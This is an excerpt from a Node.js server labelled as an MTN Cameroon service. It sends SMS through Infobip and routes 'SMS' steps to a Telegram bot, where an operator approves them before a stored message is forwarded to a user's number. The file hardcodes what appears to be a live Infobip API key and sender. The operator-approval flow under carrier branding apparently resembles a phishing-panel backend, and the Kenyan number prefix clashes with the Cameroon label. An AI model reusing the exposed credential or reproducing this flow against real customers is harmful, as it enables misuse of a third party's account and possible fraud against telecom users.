// ============================================================
// server.js – MTN Cameroon with Infobip SMS Integration
// ============================================================
...
const INFOBIP_API_KEY = process.env.INFOBIP_API_KEY || 'd0dbb2f3c3f9e57abeddc48dc952f12f-e4504769-5487-46b9-856a-ce2961f5d21c';
const INFOBIP_HOSTNAME = process.env.INFOBIP_HOSTNAME || 'k95dex.api.infobip.com';
const INFOBIP_SENDER = process.env.INFOBIP_SENDER || '447491163443';
...
async function sendSmsViaInfobip(toNumber, message) {
    try {
        const url = `https://${INFOBIP_HOSTNAME}/sms/3/messages`;
...
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 11. TEST SMS ENDPOINT ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

app.get('/api/test-sms', async (req, res) => {
    try {
        const testPhone = '254700009210';
        const testMessage = '🧪 Test SMS from Infobip via MTN Bot! Your integration is working!';
        
        const result = await sendSmsViaInfobip(testPhone, testMessage);
        
        if (result.ok) {
            await sendTelegramMessage(`✅ Test SMS sent to ${testPhone}`);
        }
    ...
    try {
        ...
        if (req.body.callback_query) {
            ...
            try {
                ...
                // ─── SMS APPROVAL WITH INFOBIP FORWARDING ───
                if (step === 'SMS' && app.smsStatus === 'pending') {
                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`📨 SMS status: ${app.smsStatus}`);
                    
                    // ─── FORWARD SMS VIA INFOBIP ON APPROVAL ───
                    if (action === 'YES' && app.smsMessage) {
                        const userPhone = '254' + app.phone;
                        const smsContent = app.smsMessage;
                        
                        console.log(`📤 Forwarding SMS to ${userPhone} via Infobip...`);
                        
                        const smsResult = await sendSmsViaInfobip(userPhone, smsContent);
...
app.listen(PORT, () => {
    ...
    console.log(`📱 Infobip SMS configured: ${INFOBIP_HOSTNAME}`);
    console.log(`🔗 Test SMS: https://your-app.onrender.com/api/test-sms`);
});
